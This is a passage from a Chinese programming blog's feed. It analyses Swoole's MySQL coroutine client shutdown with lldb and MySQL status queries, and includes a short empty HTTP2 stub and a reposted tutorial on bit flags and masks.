class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">$res = $stmt-&gt;execute([<span class="string">'id'</span> =&gt; <span class="number">1</span>]);</span><br></pre></td></tr></table></figure></p><h3 id="缺失的流程"><a href="#缺失的流程" class="headerlink" title="缺失的流程"></a>缺失的流程</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7qnai0mxj30rv05egn7.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>很容易可以发现, PDO比Swoole多做了一些<strong>善后处理</strong>, 在statement对象销毁时, 触发了destruct主动通知mysql销毁了模板语句, 然后在pdo对象销毁时, 又主动通知了mysql该会话/连接退出.</p><hr><p>马上我怀疑是我没有主动在swoole调用close关闭的缘故, 但是close应该是在destruct的时候自动触发的, 所以我们需要深入一波源码, 看看swoole是否有做收尾工作.</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>直接通过文件名和关键字搜索来查看对应源码也是可以的, 但是用gdb调试来查看底层C内部运作的流程会更酷.</p><p>Mac下使用lldb工具更佳, 操作和gdb大同小异.</p><p>在终端中输入:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb php "/path/to/swoole-mysql.php"</span><br></pre></td></tr></table></figure><p>就可以在lldb中设置调试程序和对应脚本(实际上是调试PHP这个C程序, 并添加了path作为第一个argument)</p><p>由于Swoole的协程运作机制异常复杂, PHP脚本并不是像代码那样按序从头到尾运行一遍那么简单, go函数会立即返回, Swoole会在脚本结尾注册shutdown-function, 然后进入事件循环, 这里我有空会写一篇新文章分析, 所以按照常规方式操作并不能分析该脚本的调用栈.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> b = breakpoint; r = run</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ==================</span></span><br><span class="line">b "zim_swoole_mysql_coro___destruct"</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>此时可能会提示<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1: no locations (pending).</span><br><span class="line">WARNING:  Unable to resolve breakpoint to any actual locations.</span><br></pre></td></tr></table></figure></p><p>实际上是可以下断点的, 只是由于某些的缘故lldb找不到该位置, 有待分析</p><p>然后你就可以看到程序运行了并断在了这里, 你可以输入<code>list</code>来展开源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x00000001038aace3</span> swoole.so`zim_swoole_mysql_coro___destruct(execute_data=<span class="number">0x0000000101c85210</span>, return_value=<span class="number">0x00007ffeefbfd998</span>) at swoole_mysql_coro.c:<span class="number">1088</span></span><br><span class="line">   <span class="number">1085</span></span><br><span class="line">   <span class="number">1086</span><span class="function"><span class="keyword">static</span> <span class="title">PHP_METHOD</span><span class="params">(swoole_mysql_coro, __destruct)</span></span></span><br><span class="line"><span class="function">   1087</span>&#123;</span><br><span class="line">-&gt; <span class="number">1088</span>    mysql_client *client = swoole_get_object(getThis());</span><br><span class="line">   <span class="number">1089</span>    <span class="keyword">if</span> (!client)</span><br><span class="line">   <span class="number">1090</span>    &#123;</span><br><span class="line">   <span class="number">1091</span>        <span class="keyword">return</span>;</span><br><span class="line">Target <span class="number">0</span>: (php) stopped.</span><br><span class="line">(lldb) <span class="built_in">list</span></span><br><span class="line">   <span class="number">1092</span>    &#125;</span><br><span class="line">   <span class="number">1093</span>    <span class="keyword">if</span> (client-&gt;state != SW_MYSQL_STATE_CLOSED &amp;&amp; client-&gt;cli)</span><br><span class="line">   <span class="number">1094</span>    &#123;</span><br><span class="line">   <span class="number">1095</span>        swoole_mysql_coro_close(getThis());</span><br><span class="line">   <span class="number">1096</span>    &#125;</span><br><span class="line">   <span class="number">1097</span>    <span class="keyword">if</span> (client-&gt;buffer)</span><br><span class="line">   <span class="number">1098</span>    &#123;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1099</span>        swString_free(client-&gt;buffer);</span><br><span class="line">   <span class="number">1100</span>    &#125;</span><br><span class="line">   <span class="number">1101</span>    efree(client);</span><br><span class="line">   <span class="number">1102</span>    swoole_set_object(getThis(), <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">1103</span></span><br><span class="line">   <span class="number">1104</span>    php_context *context = swoole_get_property(getThis(), <span class="number">0</span>);</span><br><span class="line">   <span class="number">1105</span>    <span class="keyword">if</span> (!context)</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1106</span>    &#123;</span><br><span class="line">   <span class="number">1107</span>        <span class="keyword">return</span>;</span><br><span class="line">   <span class="number">1108</span>    &#125;</span><br><span class="line">   <span class="number">1109</span>    <span class="keyword">if</span> (likely(context-&gt;state == SW_CORO_CONTEXT_RUNNING))</span><br><span class="line">   <span class="number">1110</span>    &#123;</span><br><span class="line">   <span class="number">1111</span>        efree(context);</span><br><span class="line">   <span class="number">1112</span>    &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1113</span>    <span class="keyword">else</span></span><br><span class="line">   <span class="number">1114</span>    &#123;</span><br><span class="line">   <span class="number">1115</span>        context-&gt;state = SW_CORO_CONTEXT_TERM;</span><br><span class="line">   <span class="number">1116</span>    &#125;</span><br><span class="line">   <span class="number">1117</span>    swoole_set_property(getThis(), <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">1118</span>&#125;</span><br><span class="line">   <span class="number">1119</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1120</span><span class="function"><span class="keyword">static</span> <span class="title">PHP_METHOD</span><span class="params">(swoole_mysql_coro, close)</span></span></span><br><span class="line"><span class="function">   1121</span>&#123;</span><br><span class="line">   <span class="number">1122</span>    <span class="keyword">if</span> (swoole_mysql_coro_close(getThis()) == FAILURE)</span><br><span class="line">   <span class="number">1123</span>    &#123;</span><br><span class="line">   <span class="number">1124</span>        RETURN_FALSE;</span><br><span class="line">   <span class="number">1125</span>    &#125;</span><br><span class="line">   <span class="number">1126</span><span class="meta">#<span class="meta-keyword">if</span> PHP_MAJOR_VERSION &lt; 7</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">1127</span>    sw_zval_ptr_dtor(&amp;getThis());</span><br><span class="line">   <span class="number">1128</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   <span class="number">1129</span>RETURN_TRUE;</span><br><span class="line">   <span class="number">1130</span>&#125;</span><br></pre></td></tr></table></figure><p>在析构函数中的1095行, 和close函数中的1122行, 我们都可以看到调用了swoole_mysql_coro_close方法, 再次下断点调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x00000001030ae573</span> swoole.so`swoole_mysql_coro_close(<span class="keyword">this</span>=<span class="number">0x0000000101c85230</span>) at swoole_mysql_coro.c:<span class="number">180</span></span><br><span class="line">   <span class="number">177</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">swoole_mysql_coro_close</span><span class="params">(zval *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function">   178 </span>&#123;</span><br><span class="line">   <span class="number">179</span>     SWOOLE_GET_TSRMLS;</span><br><span class="line">-&gt; <span class="number">180</span>     mysql_client *client = swoole_get_object(<span class="keyword">this</span>);</span><br><span class="line">   <span class="number">181</span>     <span class="keyword">if</span> (!client)</span><br><span class="line">   <span class="number">182</span>     &#123;</span><br><span class="line">   <span class="number">183</span>         swoole_php_fatal_error(E_WARNING, <span class="string">"object is not instanceof swoole_mysql_coro."</span>);</span><br><span class="line">Target <span class="number">0</span>: (php) stopped.</span><br><span class="line">(lldb) l</span><br><span class="line">   <span class="number">184</span>         <span class="keyword">return</span> FAILURE;</span><br><span class="line">   <span class="number">185</span>     &#125;</span><br><span class="line">   <span class="number">186</span></span><br><span class="line">   <span class="number">187</span>     <span class="keyword">if</span> (!client-&gt;cli)</span><br><span class="line">   <span class="number">188</span>     &#123;</span><br><span class="line">   <span class="number">189</span>         <span class="keyword">return</span> FAILURE;</span><br><span class="line">   <span class="number">190</span>     &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">191</span></span><br><span class="line">   <span class="number">192</span>     zend_update_property_bool(swoole_mysql_coro_class_entry_ptr, <span class="keyword">this</span>, ZEND_STRL(<span class="string">"connected"</span>), <span class="number">0</span> TSRMLS_CC);</span><br><span class="line">   <span class="number">193</span>     SwooleG.main_reactor-&gt;del(SwooleG.main_reactor, client-&gt;fd);</span><br><span class="line">   <span class="number">194</span></span><br><span class="line">   <span class="number">195</span>     swConnection *_socket = swReactor_get(SwooleG.main_reactor, client-&gt;fd);</span><br><span class="line">   <span class="number">196</span>     _socket-&gt;object = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="number">197</span>     _socket-&gt;active = <span class="number">0</span>;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">198</span></span><br><span class="line">   <span class="number">199</span>     <span class="keyword">if</span> (client-&gt;timer)</span><br><span class="line">   <span class="number">200</span>     &#123;</span><br><span class="line">   <span class="number">201</span>         swTimer_del(&amp;SwooleG.timer, client-&gt;timer);</span><br><span class="line">   <span class="number">202</span>         client-&gt;timer = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="number">203</span>     &#125;</span><br><span class="line">   <span class="number">204</span></span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">205</span>     <span class="keyword">if</span> (client-&gt;statement_list)</span><br><span class="line">   <span class="number">206</span>     &#123;</span><br><span class="line">   <span class="number">207</span>         swLinkedList_node *node = client-&gt;statement_list-&gt;head;</span><br><span class="line">   <span class="number">208</span>         <span class="keyword">while</span> (node)</span><br><span class="line">   <span class="number">209</span>         &#123;</span><br><span class="line">   <span class="number">210</span>             mysql_statement *stmt = node-&gt;data;</span><br><span class="line">   <span class="number">211</span>             <span class="keyword">if</span> (stmt-&gt;object)</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">212</span>             &#123;</span><br><span class="line">   <span class="number">213</span>                 swoole_set_object(stmt-&gt;object, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="number">214</span>                 efree(stmt-&gt;object);</span><br><span class="line">   <span class="number">215</span>             &#125;</span><br><span class="line">   <span class="number">216</span>             efree(stmt);</span><br><span class="line">   <span class="number">217</span>             node = node-&gt;next;</span><br><span class="line">   <span class="number">218</span>         &#125;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">219</span>         swLinkedList_free(client-&gt;statement_list);</span><br><span class="line">   <span class="number">220</span>     &#125;</span><br><span class="line">   <span class="number">221</span></span><br><span class="line">   <span class="number">222</span>     client-&gt;cli-&gt;close(client-&gt;cli);</span><br><span class="line">   <span class="number">223</span>     swClient_free(client-&gt;cli);</span><br><span class="line">   <span class="number">224</span>     efree(client-&gt;cli);</span><br><span class="line">   <span class="number">225</span>     client-&gt;cli = <span class="literal">NULL</span>;</span><br><span class="line">(lldb)</span><br><span class="line">   <span class="number">226</span>     client-&gt;state = SW_MYSQL_STATE_CLOSED;</span><br><span class="line">   <span class="number">227</span>     client-&gt;iowait = SW_MYSQL_CORO_STATUS_CLOSED;</span><br><span class="line">   <span class="number">228</span></span><br><span class="line">   <span class="number">229</span>     <span class="keyword">return</span> SUCCESS;</span><br><span class="line">   <span class="number">230</span> &#125;</span><br></pre></td></tr></table></figure><p>析构函数中可以看到一系列对自身的”清理操作”, 因为对象要被销毁了.</p><p>而swoole_mysql_coro_close中可以看到一系列”关闭操作”和对该client所持有的statement们的清理操作, statement_list是一个链表, statement的标识ID是依赖于指定会话连接的, 索引ID从1开始, 连接关闭了所以statement必须在这时就销毁.</p><p>而222行的<code>client-&gt;cli-&gt;close(client-&gt;cli)</code>是用swoole的client进行了TCP连接关闭.</p><h2 id="结论和进一步深思"><a href="#结论和进一步深思" class="headerlink" title="结论和进一步深思"></a>结论和进一步深思</h2><p>所以我们可以发现, Swoole只对自己进行了清理, 并且关闭了TCP连接, 而没有在MySQL协议层面进行连接关闭, 这样会不会造成MySQL服务端还长期存在连接, 并没有销毁清理的情况呢?</p><p>首先, 在连接尚未关闭但是statement对象被销毁的时候, swoole并不会通知mysql去销毁语句模板, 所以要是长连接的时候有很多语句在swoole端一次性使用了的话, mysql那边应该会一直保存着那些语句模板, 等待这个连接下一次可能的使用.</p><h3 id="验证-查看未关闭的连接"><a href="#验证-查看未关闭的连接" class="headerlink" title="验证: 查看未关闭的连接"></a>验证: 查看未关闭的连接</h3><p>而swoole端对tcp连接关闭后, mysql端没有收到mysql协议层面的关闭消息, 会不会还傻傻等着呢?</p><p>这时候我们可以运行一下脚本, 然后在mysql端使用<code>show full processlist</code>来查看连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show full processlist;</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">| Id  | User | Host            | db   | Command | Time | State    | Info                  |</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">| 151 | root | localhost:58186 | NULL | Query   |    0 | starting | show full processlist |</span><br><span class="line">+-----+------+-----------------+------+---------+------+----------+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>Woo! 除了我们当前连接居然没有其他连接了, 说明MySQL在TCP连接关闭时就”智能”地清除了会话.</p><h3 id="最后验证-真的没有影响吗"><a href="#最后验证-真的没有影响吗" class="headerlink" title="最后验证: 真的没有影响吗?"></a>最后验证: 真的没有影响吗?</h3><p>我们程序员要有刨根问底精神, 连接强制关闭了, 真的没有副作用吗?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show status like &apos;%Abort_%&apos;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Aborted_clients  | 118   |</span><br><span class="line">| Aborted_connects | 0     |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><blockquote><p>Aborted_clients 由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。</p><p>Aborted_connects 尝试已经失败的MySQL服务器的连接的次数。 </p></blockquote><p>可以看到, MySQL统计了异常中断的客户端和连接, 在我们近期的使用中, 没有正确关闭连接的客户端有118个</p><p>但是MySQL既然可以统计到该数据, 自然也可以对这些客户端连接进行正常清理, 比较还有一手TCP层面的逻辑在里头, 但是这样粗暴地关闭, 就像我们平时手机杀程序清内存或者强制关机的操作一样, 一般来说无甚危害, <strong>但是万一哪天真的发生了异常, 客户端大量死掉, 我们也很难去发现了.</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;众所周知, PHP是由C语言编写的, 扩展也不例外, Swoole又是PHP扩展中发展的比较快且很权威的一个扩展, 对于MySQL这部分模块的浅析, 暂可不必了解Swoole底层的实现, 而先关注应用层面的实现.&lt;/p&gt;
&lt;h2 id=&quot;基础要求&quot;&gt;&lt;a href=&quot;#基础要求&quot; class=&quot;headerlink&quot; title=&quot;基础要求&quot;&gt;&lt;/a&gt;基础要求&lt;/h2&gt;&lt;p&gt;所以除了PHP我们仅需了解以下几个方面的知识:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;MySQL基础&lt;/li&gt;
&lt;li&gt;TCP网络协议基础(MySQL协议)&lt;/li&gt;
&lt;li&gt;C语言基础及其简单调试&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;而使用过Swoole的同学一定对以下工具不陌生:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;GDB&lt;/code&gt;(Mac下用&lt;code&gt;LLDB&lt;/code&gt;)和&lt;code&gt;Valgrind&lt;/code&gt;作为源码/内存分析&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Wireshark&lt;/code&gt;或&lt;code&gt;TcpDump&lt;/code&gt;作为网络分析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
      <category term="swoole" scheme="http://www.twosee.cn/tags/swoole/"/>
    
  </entry>
  
  <entry>
    <title>why-not-http2</title>
    <link href="http://www.twosee.cn/2018/04/09/why-not-http2/"/>
    <id>http://www.twosee.cn/2018/04/09/why-not-http2/</id>
    <published>2018-04-09T03:07:20.000Z</published>
    <updated>2018-04-09T03:07:39.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Why-not-HTTP2"><a href="#Why-not-HTTP2" class="headerlink" title="Why not HTTP2"></a>Why not HTTP2</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Why-not-HTTP2&quot;&gt;&lt;a href=&quot;#Why-not-HTTP2&quot; class=&quot;headerlink&quot; title=&quot;Why not HTTP2&quot;&gt;&lt;/a&gt;Why not HTTP2&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="Http2" scheme="http://www.twosee.cn/tags/Http2/"/>
    
  </entry>
  
  <entry>
    <title>[整理]【位运算经典应用】 标志位与掩码</title>
    <link href="http://www.twosee.cn/2018/04/06/mask-code/"/>
    <id>http://www.twosee.cn/2018/04/06/mask-code/</id>
    <published>2018-04-06T15:03:01.000Z</published>
    <updated>2018-04-06T15:03:43.059Z</updated>
    
    <content type="html"><![CDATA[<h3 id="整理-【位运算经典应用】-标志位与掩码"><a href="#整理-【位运算经典应用】-标志位与掩码" class="headerlink" title="[整理]【位运算经典应用】 标志位与掩码"></a>[整理]【位运算经典应用】 标志位与掩码</h3><blockquote><p>本文原文来源自 <a href="http://www.cnblogs.com/zichi/p/4792589.html" target="_blank" rel="noopener">http://www.cnblogs.com/zichi/p/4792589.html</a></p><p>相关内容经过整理, ABCD几个水果单词更加容易对应起来</p></blockquote><p>前面我们已经了解了六大位操作符（<code>&amp;</code> <code>|</code> <code>~</code> <code>^</code> <code>&lt;&lt;</code> <code>&gt;&gt;</code>)的用法（<a href="http://www.cnblogs.com/zichi/p/4787145.html" target="_blank" rel="noopener">javascript 位运算</a>），也整理了一些常用的位运算操作（<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a>），本文我们继续深入位运算，来了解下二进制的经典应用-标志位与掩码。</p><p>位运算经常被用来创建、处理以及读取标志位序列——一种类似二进制的变量。虽然可以使用变量代替标志位序列，但是这样可以节省内存（1/32）。</p><p>例如有4个标志位：</p><ol><li>标志位A： 我们有 Apple</li><li>标志位B： 我们有 Banana</li><li>标志位C： 我们有 Cherry</li><li>标志位D： 我们有 Dew</li></ol><p>标志位通过位序列DCBA来表示，当一个位置被置为1时，表示有该项，置为0时，表示没有该项。例如一个变量flag=9，二进制表示为1001，就表示我们有D和A。</p><p>掩码 (bitmask) 是一个通过与/或来读取标志位的位序列。典型的定义每个标志位的原语掩码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> FLAG_A = <span class="number">1</span>; <span class="comment">// 0001</span></span><br><span class="line"><span class="keyword">var</span> FLAG_B = <span class="number">2</span>; <span class="comment">// 0010</span></span><br><span class="line"><span class="keyword">var</span> FLAG_C = <span class="number">4</span>; <span class="comment">// 0100</span></span><br><span class="line"><span class="keyword">var</span> FLAG_D = <span class="number">8</span>; <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>新的掩码可以在以上掩码上使用逻辑运算创建。例如，掩码 1011 可以通过 FLAG_A、FLAG_B 和 FLAG_D 逻辑或得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mask = FLAG_A | FLAG_B | FLAG_D; <span class="comment">// 0001 | 0010 | 1000 =&gt; 1011</span></span><br></pre></td></tr></table></figure><p>某个特定的位可以通过与掩码做逻辑与运算得到，通过与掩码的与运算可以去掉无关的位，得到特定的位。例如，掩码 0100 可以用来检查标志位 C 是否被置位：（<strong>核心就是判断某位上的数</strong> 参考<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a> 下同）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Cherry</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FLAG_C) &#123; <span class="comment">// 0101 &amp; 0100 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个有多个位被置位的掩码表达任一/或者的含义。例如，以下两个表达是等价的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Banana 或者 Cherry 至少一个</span></span><br><span class="line"><span class="comment">// (0101 &amp; 0010) || (0101 &amp; 0100) =&gt; 0000 || 0100 =&gt; true</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; FLAG_B) || (flags &amp; FLAG_C)) &#123;</span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C; <span class="comment">// 0010 | 0100 =&gt; 0110</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; mask) &#123; <span class="comment">// 0101 &amp; 0110 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过与掩码做或运算设置标志位，掩码中为 1 的位可以设置对应的位。例如掩码 1100 可用来设置位 C 和 D：（<strong>核心就是将某位变为1</strong> ）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们有 Cherry 和 Dew</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_C | FLAG_D; <span class="comment">// 0100 | 1000 =&gt; 1100</span></span><br><span class="line">flags |= mask;   <span class="comment">// 0101 | 1100 =&gt; 1101</span></span><br></pre></td></tr></table></figure><p>可以通过与掩码做与运算清除标志位，掩码中为 0 的位可以设置对应的位。掩码可以通过对原语掩码做非运算得到。例如，掩码 1010 可以用来清除标志位 A 和 C ：（<strong>核心就是将某位变为0</strong>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~(FLAG_A | FLAG_C); <span class="comment">// ~0101 =&gt; 1010</span></span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure><p>如上的掩码同样可以通过 ~FLAG_A &amp; ~FLAG_C 得到（德摩根定律）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~FLAG_A &amp; ~FLAG_C;</span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure><p>标志位可以使用异或运算切换。所有值为 1 的为可以切换对应的位。例如，掩码 0110 可以用来切换标志位 B 和 C：（<strong>核心就是将某位取反</strong>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们以前没有 Banana ，那么我们现在有 Banana</span></span><br><span class="line"><span class="comment">// 但是如果我们已经有了一个，那么现在没有了</span></span><br><span class="line"><span class="comment">// 对 Cherry 也是相同的情况</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C;</span><br><span class="line">flags = flags ^ mask;   <span class="comment">// 1100 ^ 0110 =&gt; 1010</span></span><br></pre></td></tr></table></figure><p>最后，所有标志位可以通过非运算翻转：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entering parallel universe...</span></span><br><span class="line">flags = ~flags;    <span class="comment">// ~1010 =&gt; 0101</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;整理-【位运算经典应用】-标志位与掩码&quot;&gt;&lt;a href=&quot;#整理-【位运算经典应用】-标志位与掩码&quot; class=&quot;headerlink&quot; title=&quot;[整理]【位运算经典应用】 标志位与掩码&quot;&gt;&lt;/a&gt;[整理]【位运算经典应用】 标志位与掩码&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;本文原文来源自 &lt;a href=&quot;http://www.cnblogs.com/zichi/p/4792589.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.cnblogs.com/zichi/p/4792589.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关内容经过整理, ABCD几个水果单词更加容易对应起来&lt;/p&gt;
&lt;/blockquote&gt;
